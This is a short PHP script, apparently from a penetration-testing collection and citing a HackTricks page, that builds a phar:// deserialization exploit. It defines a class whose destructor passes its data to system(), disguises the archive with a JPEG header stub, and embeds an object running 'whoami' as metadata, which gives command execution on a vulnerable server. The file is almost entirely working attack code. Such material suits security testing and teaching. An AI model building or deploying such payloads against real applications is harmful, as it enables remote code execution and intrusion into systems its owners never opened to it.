<?php

/**
 * Reference
 * phar:// deserialization - HackTricks
 * https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization
 */

class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }

    function __destruct() {
        system($this->data);
    }
}

// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
